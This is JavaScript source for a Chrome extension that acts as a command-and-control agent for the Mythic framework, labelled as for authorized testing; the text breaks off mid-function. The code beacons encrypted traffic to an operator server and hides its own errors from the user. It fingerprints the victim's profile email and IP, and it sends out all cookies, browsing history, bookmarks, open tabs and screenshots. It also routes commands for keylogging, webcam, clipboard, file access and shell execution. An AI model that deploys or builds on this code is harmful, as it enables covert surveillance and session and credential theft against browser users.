// Hades - Mythic C2 Chrome Extension Agent (WebSocket + HTTP)
// For authorized security testing only. Ensure written permission before deployment.

// ── Build-time constants (substituted by hades.py builder) ───────────────────
const AES_PSK_B64   = "AES_PSK_PLACEHOLDER";        // base64(32-byte AES-256 key) — PSK mode
const RSA_PUB_B64   = "RSA_PUB_PLACEHOLDER";        // base64(RSA SPKI DER pubkey) — EKE mode
const PAYLOAD_UUID  = "PAYLOAD_UUID_HERE";           // 36-char UUID from Mythic
const WS_C2_URL     = "WS_URL_PLACEHOLDER";          // wss://host:port/path  — empty = disabled
const HTTP_C2_URL   = "HTTP_URL_PLACEHOLDER";        // https://host:port/path — empty = disabled
const DEPLOY_LABEL  = "DEPLOY_LABEL_PLACEHOLDER";   // operator-supplied deploy label (optional)
const BUILD_TIME    = "BUILD_TIME_PLACEHOLDER";      // UTC timestamp baked in at build
// ─────────────────────────────────────────────────────────────────────────────

// Suppress unhandled exceptions and promise rejections from appearing as errors
// in chrome://extensions. Without these, any uncaught exception creates a
// visible error badge that reveals the extension is misbehaving.
self.addEventListener('error',              (e) => { e.preventDefault(); });
self.addEventListener('unhandledrejection', (e) => { e.preventDefault(); });

let mythicCallbackId = null;
let stagingUUID      = null;     // temp UUID from EKE staging response
let ekeDone          = false;    // true once RSA key exchange is complete
let socket           = null;
let connectTimer     = null;
let heartbeatTimer   = null;
let backoffMs        = 1000;
const backoffMaxMs   = 30000;
const OUTBOX         = [];       // plaintext action objects queued while transport is down
let sleepIntervalMs  = 10000;
let aesKey           = null;     // AES-256-CBC CryptoKey
let hmacKey          = null;     // HMAC-SHA256 CryptoKey (same raw material as aesKey)

// ── Crypto helpers ────────────────────────────────────────────────────────────
function bytesToBase64(bytes) {
  let binary = "";
  for (let i = 0; i < bytes.length; i++) binary += String.fromCharCode(bytes[i]);
  return btoa(binary);
}

function base64ToBytes(b64) {
  const binary = atob(b64);
  const out = new Uint8Array(binary.length);
  for (let i = 0; i < binary.length; i++) out[i] = binary.charCodeAt(i);
  return out;
}

async function importMythicKeys() {
  if (aesKey) return;
  // In PSK mode, import the static key. In EKE mode, keys are set by performStaging().
  if (!AES_PSK_B64) return;
  const raw = base64ToBytes(AES_PSK_B64);
  await importSessionKey(raw);
}

async function importSessionKey(raw) {
  aesKey  = await crypto.subtle.importKey("raw", raw, { name: "AES-CBC" },  false, ["encrypt", "decrypt"]);
  hmacKey = await crypto.subtle.importKey("raw", raw, { name: "HMAC", hash: "SHA-256" }, false, ["sign", "verify"]);
}

// Mythic aes256_hmac outbound format:
//   base64( UUID[36] + IV[16] + AES-256-CBC(plaintext) + HMAC-SHA256(IV+ciphertext)[32] )
async function encryptForMythic(actionObj) {
  await importMythicKeys();
  const prefix    = mythicCallbackId || stagingUUID || PAYLOAD_UUID;
  const plaintext = new TextEncoder().encode(JSON.stringify(actionObj));
  const iv        = crypto.getRandomValues(new Uint8Array(16));

  const ciphertext = new Uint8Array(
    await crypto.subtle.encrypt({ name: "AES-CBC", iv }, aesKey, plaintext)
  );

  const hmacInput = new Uint8Array(iv.length + ciphertext.length);
  hmacInput.set(iv, 0);
  hmacInput.set(ciphertext, iv.length);
  const hmac = new Uint8Array(
    await crypto.subtle.sign({ name: "HMAC" }, hmacKey, hmacInput)
  );

  const uuidBytes = new TextEncoder().encode(prefix);   // 36 bytes
  const combined  = new Uint8Array(36 + 16 + ciphertext.length + 32);
  combined.set(uuidBytes, 0);
  combined.set(iv, 36);
  combined.set(ciphertext, 52);
  combined.set(hmac, 52 + ciphertext.length);
  return bytesToBase64(combined);
}

// Mythic aes256_hmac inbound format:
//   base64( UUID[36] + IV[16] + ciphertext + HMAC-SHA256[32] )
async function decryptFromMythic(b64data) {
  await importMythicKeys();
  const raw        = base64ToBytes(b64data);
  const iv         = raw.slice(36, 52);
  const hmac       = raw.slice(raw.length - 32);
  const ciphertext = raw.slice(52, raw.length - 32);

  const hmacInput = new Uint8Array(16 + ciphertext.length);
  hmacInput.set(iv, 0);
  hmacInput.set(ciphertext, 16);
  const valid = await crypto.subtle.verify({ name: "HMAC" }, hmacKey, hmac, hmacInput);
  if (!valid) throw new Error("HMAC verification failed");

  const plain = await crypto.subtle.decrypt({ name: "AES-CBC", iv }, aesKey, ciphertext);
  return JSON.parse(new TextDecoder().decode(plain));
}

// ── Mythic protocol ───────────────────────────────────────────────────────────
// sendToMythic: encrypts, then tries WS → HTTP → OUTBOX in that order.
// Returns a Promise so callers can await or ignore it.
async function sendToMythic(actionObj) {
  const b64    = await encryptForMythic(actionObj);
  const packet = JSON.stringify({ client: true, data: b64, tag: "" });

  // Primary: WebSocket
  if (WS_C2_URL && socket && socket.readyState === WebSocket.OPEN) {
    socket.send(packet);
    return;
  }

  // Secondary: HTTP
  if (HTTP_C2_URL) {
    try {
      const resp = await fetch(HTTP_C2_URL, {
        method:  "POST",
        headers: { "Content-Type": "application/json" },
        body:    packet
      });
      if (resp.ok) {
        const text = await resp.text();
        if (text && text.trim()) {
          handleMythicMessage(text).catch(() => {});
        }
      }
      return;
    } catch (e) {
    }
  }

  // Fallback: queue for next successful transport window
  OUTBOX.push(actionObj);
  if (WS_C2_URL) connect();
}

// ── EKE (RSA key exchange) staging ───────────────────────────────────────────
// When encrypted_exchange_check=true on the C2 profile, Mythic embeds an RSA
// public key instead of an AES PSK. The agent generates a random AES session
// key, RSA-encrypts it, and sends a staging request. Mythic responds with a
// permanent session key encrypted under the temp key. All subsequent traffic
// uses the negotiated session key — no static key in the payload to extract.
async function sendRawToMythic(b64data) {
  const packet = JSON.stringify({ client: true, data: b64data, tag: "" });
  if (WS_C2_URL && socket && socket.readyState === WebSocket.OPEN) {
    socket.send(packet);
    return; // response arrives via onmessage
  }
  if (HTTP_C2_URL) {
    try {
      const resp = await fetch(HTTP_C2_URL, {
        method:  "POST",
        headers: { "Content-Type": "application/json" },
        body:    packet
      });
      if (resp.ok) {
        const text = await resp.text();
        if (text && text.trim()) {
          await handleMythicMessage(text);
        }
      }
    } catch (e) {
    }
  }
}

// Strip PEM headers/footers and whitespace, return clean base64
function cleanPemToBase64(raw) {
  return raw
    .replace(/-----BEGIN [A-Z ]+-----/g, "")
    .replace(/-----END [A-Z ]+-----/g, "")
    .replace(/\s+/g, "");
}

// PKCS#1 RSAPublicKey → SPKI SubjectPublicKeyInfo wrapper.
// Web Crypto only accepts SPKI; Mythic may provide either format.
function wrapPkcs1InSpki(pkcs1) {
  // AlgorithmIdentifier: SEQUENCE { OID rsaEncryption, NULL }
  const algoId = new Uint8Array([
    0x30, 0x0d,
    0x06, 0x09, 0x2a, 0x86, 0x48, 0x86, 0xf7, 0x0d, 0x01, 0x01, 0x01,
    0x05, 0x00
  ]);
  // BIT STRING = tag(03) + length + 0x00(unused bits) + pkcs1 bytes
  const bsPayload = new Uint8Array(1 + pkcs1.length);
  bsPayload[0] = 0x00;
  bsPayload.set(pkcs1, 1);
  const bsLen = derLenBytes(bsPayload.length);
  const bitString = new Uint8Array(1 + bsLen.length + bsPayload.length);
  bitString[0] = 0x03;
  bitString.set(bsLen, 1);
  bitString.set(bsPayload, 1 + bsLen.length);
  // Outer SEQUENCE = algoId + bitString
  const inner = new Uint8Array(algoId.length + bitString.length);
  inner.set(algoId, 0);
  inner.set(bitString, algoId.length);
  const seqLen = derLenBytes(inner.length);
  const spki = new Uint8Array(1 + seqLen.length + inner.length);
  spki[0] = 0x30;
  spki.set(seqLen, 1);
  spki.set(inner, 1 + seqLen.length);
  return spki;
}

function derLenBytes(len) {
  if (len < 128)  return new Uint8Array([len]);
  if (len < 256)  return new Uint8Array([0x81, len]);
  return new Uint8Array([0x82, (len >> 8) & 0xff, len & 0xff]);
}

async function importRsaPublicKey(b64raw) {
  // Handle PEM-wrapped keys (strip headers, whitespace)
  const b64clean = cleanPemToBase64(b64raw);
  const der = base64ToBytes(b64clean);
  const algo = { name: "RSA-OAEP", hash: "SHA-1" };

  // Try SPKI first (the standard format)
  try {
    return await crypto.subtle.importKey("spki", der.buffer, algo, false, ["encrypt"]);
  } catch (_) { /* not SPKI — fall through */ }

  // Try wrapping as PKCS#1 → SPKI
  try {
    const spki = wrapPkcs1InSpki(der);
    return await crypto.subtle.importKey("spki", spki.buffer, algo, false, ["encrypt"]);
  } catch (_) { /* not PKCS#1 either */ }

  // Last resort: try SHA-256 instead of SHA-1 (some Mythic builds)
  const algo256 = { name: "RSA-OAEP", hash: "SHA-256" };
  try {
    return await crypto.subtle.importKey("spki", der.buffer, algo256, false, ["encrypt"]);
  } catch (_) {}
  try {
    const spki = wrapPkcs1InSpki(der);
    return await crypto.subtle.importKey("spki", spki.buffer, algo256, false, ["encrypt"]);
  } catch (e) {
    throw new Error("RSA key import failed (tried SPKI+PKCS1, SHA-1+SHA-256): " + (e.message || e.name));
  }
}

async function performStaging() {

  const rsaKey = await importRsaPublicKey(RSA_PUB_B64);

  // Generate random 32-byte AES-256 session key
  const tempSessionKey = crypto.getRandomValues(new Uint8Array(32));

  // RSA-OAEP encrypt the session key with Mythic's public key
  const encryptedKey = new Uint8Array(
    await crypto.subtle.encrypt({ name: "RSA-OAEP" }, rsaKey, tempSessionKey)
  );

  // Staging message: base64( PayloadUUID[36] + RSA_encrypt(session_key) )
  const uuidBytes  = new TextEncoder().encode(PAYLOAD_UUID);
  const stagingMsg = new Uint8Array(uuidBytes.length + encryptedKey.length);
  stagingMsg.set(uuidBytes, 0);
  stagingMsg.set(encryptedKey, uuidBytes.length);
  const stagingB64 = bytesToBase64(stagingMsg);

  // Import temp session key so we can decrypt Mythic's staging response
  await importSessionKey(tempSessionKey);

  // Send staging request (raw base64, NOT AES-encrypted)
  await sendRawToMythic(stagingB64);
}

// postResponse / getTasking / checkIn are intentionally void (fire-and-forget)
// so they can be called from within Chrome callback-style code without await.
function postResponse(taskId, output, completed = true) {
  sendToMythic({
    action:    "post_response",
    responses: [{ task_id: taskId, user_output: String(output), completed }],
    delegates: []
  }).catch(() => {});
}

// postFile: single-step upload — include chunk_data in the same message as the
// registration. Mythic creates the file and links it to the task row in one shot,
// producing the download arrow without a round-trip for file_id.
function postFile(taskId, filename, base64data, isScreenshot = false, consoleMsg = "") {
  sendToMythic({
    action:    "post_response",
    responses: [{
      task_id:   taskId,
      completed: true,
      user_output: consoleMsg,
      download: {
        total_chunks:  1,
        chunk_num:     1,
        chunk_data:    base64data,
        filename:      filename,
        full_path:     "",
        is_screenshot: isScreenshot,
        host:          ""
      }
    }],
    delegates: []
  }).catch(() => {});
}

// ── Mythic file transfer via existing C2 channel ────────────────────────────
// Works over WebSocket or HTTP — no separate HTTP_C2_URL needed.
// Mythic upload protocol: agent requests chunks via post_response; server
// returns chunk_data in the response; handleMythicMessage resolves the promise.

const _pendingUploads = new Map(); // task_id → {resolve,reject,chunks,totalChunks,fileId,chunkSize,timer}

async function fetchFileViaMythicC2(taskId, fileId, chunkSize = _FILE_CHUNK_RAW) {
  // chunk size MUST be divisible by 3 so each Mythic chunk's base64 has no
  // mid-string padding.  _FILE_CHUNK_RAW = 384*1024 = 393216 = 3*131072 ✓
  // 512*1024 = 524288 is NOT divisible by 3 → each chunk ends with = padding
  // → Python b64decode stops at the = and discards everything after it.
  return new Promise((resolve, reject) => {
    const timer = setTimeout(() => {
      _pendingUploads.delete(taskId);
      reject(new Error('Mythic upload protocol timed out after 30s'));
    }, 30000);

    _pendingUploads.set(taskId, { resolve, reject, chunks: [], totalChunks: null,
                                   fileId, chunkSize, timer });

    sendToMythic({
      action: 'post_response',
      responses: [{ task_id: taskId, user_output: '', completed: false,
        upload: { chunk_size: chunkSize, file_id: fileId, chunk_num: 1, full_path: '' } }],
      delegates: []
    }).catch(e => { clearTimeout(timer); _pendingUploads.delete(taskId); reject(e); });
  });
}

// fetchFileFromMythic: download a registered Mythic file by file_id.
// Uses Mythic's /direct/download/ endpoint, deriving the server base from
// HTTP_C2_URL (requires HTTP transport to be configured in the payload).
async function fetchFileFromMythic(fileId) {
  if (!HTTP_C2_URL) throw new Error("file_upload requires HTTP C2 transport (HTTP_C2_URL)");
  // Strip the path component to get the server root (e.g. https://c2host:443)
  const base = HTTP_C2_URL.replace(/\/[^/]*$/, "");
  const resp = await fetch(`${base}/direct/download/${fileId}`, { credentials: "omit" });
  if (!resp.ok) throw new Error(`Mythic file download failed: HTTP ${resp.status}`);
  return await resp.arrayBuffer();
}

function getTasking() {
  if (!mythicCallbackId) return;
  sendToMythic({ action: "get_tasking", tasking_size: -1, delegates: [] })
    .catch(() => {});
}

async function checkIn() {
  // EKE mode: perform RSA staging before the actual check-in
  if (RSA_PUB_B64 && !ekeDone) {
    performStaging().catch(() => {});
    return;
  }
  // Fetch external IP (best-effort, falls back to 127.0.0.1)
  let externalIp = "127.0.0.1";
  try {
    const ipResp = await fetch("https://api.ipify.org?format=text", { credentials: "omit" });
    if (ipResp.ok) externalIp = (await ipResp.text()).trim();
  } catch (_) {}

  // Get extension self-info: installed name as Chrome shows it, install type, full ID
  let extDisplayName = chrome.runtime.getManifest().name || "unknown";
  let installType    = "unknown";
  try {
    const selfInfo  = await new Promise(res => chrome.management.getSelf(res));
    extDisplayName  = selfInfo.name       || extDisplayName;
    installType     = selfInfo.installType || installType; // "development" = unpacked
  } catch (_) {}

  chrome.runtime.getPlatformInfo((platform) => {
    chrome.identity.getProfileUserInfo((profile) => {
      const extId     = chrome.runtime.id;                      // full 32-char ID
      const userHint  = (profile.email || "unknown").split("@")[0];
      const ua        = navigator.userAgent.match(/Chrome\/([\d.]+)/)?.[1] || "";

      // host: "ExtensionName @ os-arch-userHint"  — human-readable, unique per install
      const hostName  = `${extDisplayName} @ ${platform.os}-${platform.arch}-${userHint}`;

      // domain: full extension ID + install type + Chrome version
      // This is the folder name Chrome uses for the extension on disk:
      //   Windows: %LOCALAPPDATA%\Google\Chrome\User Data\Default\Extensions\<extId>
      //   macOS:   ~/Library/Application Support/Google/Chrome/Default/Extensions/<extId>
      //   Linux:   ~/.config/google-chrome/Default/Extensions/<extId>
      const labelPart = DEPLOY_LABEL ? ` label:${DEPLOY_LABEL}` : "";
      const domainStr = `ext:${extId} [${installType}] Chrome/${ua} built:${BUILD_TIME}${labelPart}`;

      sendToMythic({
        action:          "checkin",
        uuid:            PAYLOAD_UUID,
        os:              platform.os,
        architecture:    platform.arch,
        user:            profile.email || "unknown",
        host:            hostName,
        pid:             Array.from(extId).reduce((h, c) => ((h << 5) - h + c.charCodeAt(0)) | 0, 0) & 0x7fff,
        ip:              externalIp,
        domain:          domainStr,
        integrity_level: 2,
        external_ip:     externalIp
      }).catch(() => {});
    });
  });
}

// ── Inbound message handler ───────────────────────────────────────────────────
async function handleMythicMessage(rawData) {
  let msg;
  try {
    const wrapper = JSON.parse(rawData);
    msg = await decryptFromMythic(wrapper.data);
  } catch (e) {
    return;
  }

  switch (msg.action) {
    case "staging_rsa": {
      // EKE staging response — Mythic sends back a permanent session key
      if (msg.session_key) {
        const permanentKeyRaw = base64ToBytes(msg.session_key);
        await importSessionKey(permanentKeyRaw);
        stagingUUID = msg.uuid || null;
        ekeDone = true;
        checkIn(); // now perform the real check-in with the session key
      } else {
      }
      break;
    }
    case "checkin": {
      if (msg.id) {
        mythicCallbackId = msg.id;
        stagingUUID = null; // no longer needed
        getTasking();     // drain any tasks queued before we connected
        startHeartbeat();
      } else {
        checkIn();
      }
      break;
    }
    case "get_tasking": {
      for (const task of (msg.tasks || [])) dispatchTask(task);
      // Forward any SOCKS packets Mythic is sending to our native TCP relay
      // Go SOCKS binary removed — ip_proxy_start handles all proxying
      break;
    }
    case "post_response": {
      // Mythic upload protocol: chunk_data is at the TOP LEVEL of each response
      // object, NOT nested inside an r.upload sub-object.
      // Structure: {task_id, status, file_id, total_chunks, chunk_data}
      for (const r of (msg.responses || [])) {
        if (!r.chunk_data) continue;
        const pending = _pendingUploads.get(r.task_id);
        if (!pending) continue;
        // Chunks arrive sequentially — just push in order
        pending.chunks.push(r.chunk_data);
        pending.totalChunks = r.total_chunks;
        if (pending.chunks.length >= r.total_chunks) {
          clearTimeout(pending.timer);
          _pendingUploads.delete(r.task_id);
          pending.resolve(pending.chunks.join(''));
        } else {
          // Request next chunk
          sendToMythic({
            action: 'post_response',
            responses: [{ task_id: r.task_id, user_output: '', completed: false,
              upload: { chunk_size: pending.chunkSize, file_id: pending.fileId,
                        chunk_num: pending.chunks.length + 1, full_path: '' } }],
            delegates: []
          }).catch(() => {});
        }
      }
      break;
    }
    default:
  }
}

// ── Task dispatcher ───────────────────────────────────────────────────────────
function dispatchTask(task) {
  const cmd    = (task.command || "").trim();
  const params = task.parameters || "";


  if (cmd === "sleep") {
    let secs;
    try   { const p = JSON.parse(params); secs = parseInt(p.interval, 10); }
    catch { secs = parseInt(params, 10); }
    if (!isNaN(secs) && secs >= 0) {
      sleepIntervalMs = secs * 1000;
      chrome.storage.local.set({ sleepIntervalMs });
      startHeartbeat();
      postResponse(task.id, `Sleep interval updated to ${secs}s`);
    } else {
      postResponse(task.id, "Invalid sleep value: " + params);
    }
    return;
  }

  // __CMD__ screenshot
  if (cmd === "screenshot")      { cmdScreenshot(task);       return; }
  // __ENDCMD__
  // __CMD__ keylog,disable_keylog
  if (cmd === "keylog")          { cmdKeylogStart(task);      return; }
  if (cmd === "disable_keylog")  { cmdKeylogStop(task);       return; }
  // __ENDCMD__
  // __CMD__ autofill,disable_autofill
  if (cmd === "autofill")         { cmdAutofillStart(task);   return; }
  if (cmd === "disable_autofill") { cmdAutofillStop(task);    return; }
  // __ENDCMD__
  // __CMD__ dump_cookies
  if (cmd === "dump_cookies")    { cmdDumpCookies(task);      return; }
  // __ENDCMD__
  // __CMD__ dump_tabs
  if (cmd === "dump_tabs")       { cmdDumpTabs(task);         return; }
  // __ENDCMD__
  // __CMD__ sysinfo
  if (cmd === "sysinfo")         { cmdSysinfo(task);          return; }
  // __ENDCMD__
  // __CMD__ history
  if (cmd === "history")         { cmdHistory(task, params);  return; }
  // __ENDCMD__
  // __CMD__ bookmarks
  if (cmd === "bookmarks")       { cmdBookmarks(task);        return; }
  // __ENDCMD__
  // __CMD__ inject_tab
  if (cmd === "inject_tab") {
    let mode = "current", url = "";
    try   { const p = JSON.parse(params); mode = p.mode || "current"; url = p.url || ""; }
    catch { const pts = params.split(" "); mode = pts[0] || "current"; url = pts.slice(1).join(" "); }
    cmdInjectTab(task, mode, url);
    return;
  }
  // __ENDCMD__
  // __CMD__ idle
  if (cmd === "idle")             { cmdIdle(task);                  return; }
  // __ENDCMD__
  // __CMD__ clipboard
  if (cmd === "clipboard")        { cmdClipboard(task);             return; }
  // __ENDCMD__
  // __CMD__ download_history
  if (cmd === "download_history") { cmdDownloadHistory(task, params); return; }
  // __ENDCMD__
  // __CMD__ uptime
  if (cmd === "uptime")           { cmdUptime(task);                return; }
  // __ENDCMD__
  // __CMD__ list_extensions
  if (cmd === "list_extensions")           { cmdListExtensions(task);               return; }
  // __ENDCMD__
  // __CMD__ local_storage
  if (cmd === "local_storage")             { cmdLocalStorage(task, params);         return; }
  // __ENDCMD__
  // __CMD__ find_in_dom
  if (cmd === "find_in_dom")               { cmdFindInDom(task, params);            return; }
  // __ENDCMD__
  // __CMD__ network_monitor_start,network_monitor_stop
  if (cmd === "network_monitor_start")     { cmdNetworkMonitorStart(task);          return; }
  if (cmd === "network_monitor_stop")      { cmdNetworkMonitorStop(task);           return; }
  // __ENDCMD__
  // __CMD__ session_export
  if (cmd === "session_export")            { cmdSessionExport(task, params);        return; }
  // __ENDCMD__
  // __CMD__ download_url
  if (cmd === "download_url")              { cmdDownloadUrl(task, params);          return; }
  // __ENDCMD__
  // __CMD__ screenshot_all
  if (cmd === "screenshot_all")            { cmdScreenshotAll(task, params);       return; }
  // __ENDCMD__
  // __CMD__ geolocation
  if (cmd === "geolocation")               { cmdGeolocation(task);                  return; }
  // __ENDCMD__
  // __CMD__ webcam
  if (cmd === "webcam")                    { cmdWebcam(task);                       return; }
  // __ENDCMD__
  // __CMD__ notifications
  if (cmd === "notifications")             { cmdNotifications(task);                return; }
  // __ENDCMD__
  // __CMD__ list_pwas
  if (cmd === "list_pwas")                 { cmdListPwas(task);                     return; }
  // __ENDCMD__
  // __CMD__ download_watch,download_watch_stop
  if (cmd === "download_watch")            { cmdDownloadWatch(task);                return; }
  if (cmd === "download_watch_stop")       { cmdDownloadWatchStop(task);            return; }
  // __ENDCMD__
  // __CMD__ download_intercept_start,download_intercept_stop
  if (cmd === "download_intercept_start")  { cmdDownloadInterceptStart(task, params); return; }
  if (cmd === "download_intercept_stop")   { cmdDownloadInterceptStop(task, params);  return; }
  // __ENDCMD__
  // __CMD__ native_start,native_stop
  if (cmd === "native_start") { cmdNativeStart(task, params); return; }
  if (cmd === "native_stop")  { cmdNativeStop(task);          return; }
  // __ENDCMD__
  // __CMD__ ip_proxy_start,ip_proxy_stop
  if (cmd === "ip_proxy_start") {
    let pUrl = "", ipSocksPort = 1080, psk = "";
    try { const p = JSON.parse(params); pUrl = p.url || ""; ipSocksPort = p.socks_port || 1080; psk = p.psk || ""; } catch { pUrl = params.trim(); }
    if (!pUrl) { postResponse(task.id, "ip_proxy_start requires url= parameter (WSS URL)"); return; }
    ipProxyStart(task.id, pUrl, ipSocksPort, psk);
    return;
  }
  if (cmd === "ip_proxy_stop") { ipProxyStop(task.id); return; }
  // __ENDCMD__
  // __CMD__ file_ls,file_download,file_upload,file_delete,file_mkdir
  if (cmd === "file_ls")     { cmdFileLs(task, params);     return; }
  if (cmd === "file_download") { cmdFileDownload(task, params); return; }
  if (cmd === "file_upload")  { cmdFileUpload(task, params);  return; }
  if (cmd === "file_delete")  { cmdFileDelete(task, params);  return; }
  if (cmd === "file_mkdir")   { cmdFileMkdir(task, params);   return; }
  // __ENDCMD__
  // __CMD__ exec
  if (cmd === "exec") { cmdShellExec(task, params); return; }
  // __ENDCMD__
  if (cmd === "exit_running")      { cmdExitRunning(task);            return; }
  if (cmd === "exit_full")        { cmdExitFull(task);               return; }
  // __CMD__ reload_extension
  if (cmd === "reload_extension") { cmdReloadExtension(task);        return; }
  // __ENDCMD__

  postResponse(task.id, "Unknown command: " + cmd);
}

// ── Command implementations ───────────────────────────────────────────────────

// __CMD__ sysinfo
async function cmdSysinfo(task) {
  const platform = await new Promise(res => chrome.runtime.getPlatformInfo(res));
  const profile  = await new Promise(res => chrome.identity.getProfileUserInfo(res));

  const externalIp = await (async () => {
    try {
      const r = await fetch('https://api.ipify.org?format=json');
      return (await r.json()).ip || '';
    } catch { return ''; }
  })();

  const browser = [
    `Profile:    ${profile.email || '(no account)'}`,
    `Chrome:     ${(navigator.userAgent.match(/Chrome\/([\d.]+)/) || [])[1] || 'unknown'}`,
    `Platform:   ${platform.os} / ${platform.arch}`,
    `Ext ID:     ${chrome.runtime.id}`,
    `Build:      ${chrome.runtime.getManifest().version}`,
    `ExtIP:      ${externalIp || '(unknown)'}`,
  ];

  // Native host data — only available if ip_proxy_start with native host features was run
  if (_ipProxyNative) {
    try {
      const r = await _fileNativeRequest({ type: 'native_sysinfo', id: crypto.randomUUID() }, 6000);
      if (r && !r.error && r.hostname) {
        const arch = (r.os.includes('arm64') || r.os.includes('aarch64')) ? 'arm64' : 'x86_64';
        const native = [
          `Host:       ${r.hostname}`,
          `User:       ${r.username}`,
          `OS:         ${r.os}`,
          `Local IP:   ${r.local_ip}`,
          `Home:       ${r.home}`,
        ];
        const output = '[Machine — via native host]\n' + native.join('\n') +
                       '\n\n[Browser]\n' + browser.join('\n');
        // process_response carries structured data to sysinfo.py server-side,
        // which uses Mythic RPC to update the callback display row directly.
        sendToMythic({
          action: 'post_response',
          responses: [{
            task_id:  task.id,
            user_output: output,
            completed: true,
            process_response: {
              native_host: r.hostname,
              native_user: r.username,
              native_os:   r.os,
              native_arch: arch,
              native_ip:   r.local_ip,
            },
          }],
          delegates: [],
        }).catch(() => {});
        return;
      }
    } catch (_) {}
  }

  postResponse(task.id,
    '[Browser]\n' + browser.join('\n') +
    '\n\n(native host not running — ip_proxy_start with native host features for OS-level data)', true);
}
// __ENDCMD__

// __CMD__ history
function cmdHistory(task, params) {
  let opts = {};
  try { opts = params ? JSON.parse(params) : {}; } catch (_) {}

  const hours        = opts.lookback_hours ?? 24;
  const lookbackMs   = hours * 60 * 60 * 1000;
  const maxResults   = opts.max_results    ?? 1000;
  const domainFilter = (opts.domain_filter || "").trim();
  const startTime    = Date.now() - lookbackMs;

  chrome.history.search({ text: "", startTime, maxResults }, (items) => {
    if (chrome.runtime.lastError) {
      postResponse(task.id, "history error: " + chrome.runtime.lastError.message);
      return;
    }

    const filtered = domainFilter
      ? items.filter(it => {
          try { const h = new URL(it.url).hostname; return h === domainFilter || h.endsWith("." + domainFilter); }
          catch { return false; }
        })
      : items;

    filtered.sort((a, b) => (b.lastVisitTime || 0) - (a.lastVisitTime || 0));

    const ts = (ms) => {
      const d = new Date(ms || 0), p = n => String(n).padStart(2, "0");
      return `${d.getFullYear()}-${p(d.getMonth()+1)}-${p(d.getDate())} ${p(d.getHours())}:${p(d.getMinutes())}:${p(d.getSeconds())}`;
    };

    const lines = filtered.map(it => `[${ts(it.lastVisitTime)}] ${it.title ? it.title + " — " : ""}${it.url}`);
    if (lines.length <= 100) {
      postResponse(task.id, lines.join("\n") || "(empty history)");
    } else {
      const b64 = bytesToBase64(new TextEncoder().encode(lines.join("\n")));
      postFile(task.id, "history.txt", b64, false,
        `History: ${lines.length} entries — click the file icon on this task row to download history.txt`);
    }
  });
}
// __ENDCMD__

// __CMD__ bookmarks
function cmdBookmarks(task) {
  chrome.bookmarks.getTree((tree) => {
    const items = [], stack = [...tree];
    while (stack.length) {
      const n = stack.pop();
      if (!n.url) items.push({ title: n.title || "", url: "", date: n.dateAdded || 0, folder: true });
      else        items.push({ title: n.title || "", url: n.url, date: n.dateAdded || 0, folder: false });
      if (n.children?.length) for (const c of n.children) stack.push(c);
    }
    items.sort((a, b) => (b.date || 0) - (a.date || 0));

    const ts = (ms) => {
      const d = new Date(ms || 0), p = n => String(n).padStart(2, "0");
      return `${d.getFullYear()}-${p(d.getMonth()+1)}-${p(d.getDate())} ${p(d.getHours())}:${p(d.getMinutes())}:${p(d.getSeconds())}`;
    };

    const lines = items.map(b =>
      b.folder ? `[${ts(b.date)}] <Folder> ${b.title}`
               : `[${ts(b.date)}] ${b.title ? b.title + " — " : ""}${b.url}`
    );
    postResponse(task.id, lines.join("\n") || "(no bookmarks)");
  });
}
// __ENDCMD__

// __CMD__ dump_cookies
function cmdDumpCookies(task) {
  chrome.cookies.getAll({}, (cookies) => {
    const data = cookies.map(c => ({
      name: c.name, value: c.value, domain: c.domain, path: c.path,
      secure: c.secure, httpOnly: c.httpOnly, sameSite: c.sameSite || "no_restriction",
      session: c.session, expirationDate: c.expirationDate || null, storeId: c.storeId || null
    }));
    postResponse(task.id, JSON.stringify(data, null, 2));
  });
}
// __ENDCMD__

// __CMD__ dump_tabs
function cmdDumpTabs(task) {
  chrome.tabs.query({}, (tabs) => {
    const data = tabs.map(t => ({ id: t.id, title: t.title, url: t.url, status: t.status, active: t.active, windowId: t.windowId }));
    postResponse(task.id, JSON.stringify({ timestamp: new Date().toISOString(), tabs: data }, null, 2));
  });
}
// __ENDCMD__

// __CMD__ screenshot
function cmdScreenshot(task) {
  chrome.windows.getLastFocused({ populate: true }, async (win) => {
    if (!win || chrome.runtime.lastError) {
      postResponse(task.id, "No focused window: " + (chrome.runtime.lastError?.message || "unknown"));
      return;
    }
    const tab = (win.tabs || []).find(t => t.active);
    if (!tab) { postResponse(task.id, "No active tab in focused window"); return; }
    if (!tab.url || tab.url.startsWith("chrome://") || tab.url.startsWith("chrome-extension://")) {
      postResponse(task.id, "Cannot screenshot this tab: " + tab.url);
      return;
    }

    // Capture the composited page (GPU video frames are blank at this stage)
    const dataUrl = await new Promise(res =>
      chrome.tabs.captureVisibleTab(win.id, { format: "png" }, res));
    if (chrome.runtime.lastError || !dataUrl) {
      postResponse(task.id, "Screenshot failed: " + (chrome.runtime.lastError?.message || "no data"));
      return;
    }

    // Inject into the page to canvas-capture any playing <video> elements.
    // This works for non-DRM content (most YouTube, etc.).
    // DRM/Widevine frames are intentionally unreadable and will remain blank.
    let videoFrames = [];
    try {
      const results = await chrome.scripting.executeScript({
        target: { tabId: tab.id },
        func: () => {
          const frames = [];
          document.querySelectorAll('video').forEach(v => {
            if (!v.videoWidth || v.readyState < 2) return;
            const r = v.getBoundingClientRect();
            if (!r.width || !r.height) return;
            try {
              const c = document.createElement('canvas');
              c.width = r.width; c.height = r.height;
              c.getContext('2d').drawImage(v, 0, 0, r.width, r.height);
              frames.push({ dataUrl: c.toDataURL('image/png'),
                            x: Math.round(r.left), y: Math.round(r.top),
                            w: Math.round(r.width), h: Math.round(r.height) });
            } catch (_) { /* DRM-protected — skip */ }
          });
          return frames;
        },
      });
      videoFrames = results?.[0]?.result || [];
    } catch (_) { /* scripting blocked on this page — use plain screenshot */ }

    if (!videoFrames.length) {
      // No videos or all DRM — ship the plain screenshot
      postFile(task.id, "screenshot.png", dataUrl.split(",")[1] || "", false,
               "Screenshot captured — use the download arrow on this task row");
      return;
    }

    // Composite: draw the page screenshot then overlay each video frame
    try {
      const pageBlob = await fetch(dataUrl).then(r => r.blob());
      const pageImg  = await createImageBitmap(pageBlob);
      const canvas   = new OffscreenCanvas(pageImg.width, pageImg.height);
      const ctx      = canvas.getContext('2d');
      ctx.drawImage(pageImg, 0, 0);

      for (const f of videoFrames) {
        const vBlob = await fetch(f.dataUrl).then(r => r.blob());
        const vImg  = await createImageBitmap(vBlob);
        ctx.drawImage(vImg, f.x, f.y, f.w, f.h);
      }

      const outBlob = await canvas.convertToBlob({ type: 'image/png' });
      const reader  = new FileReader();
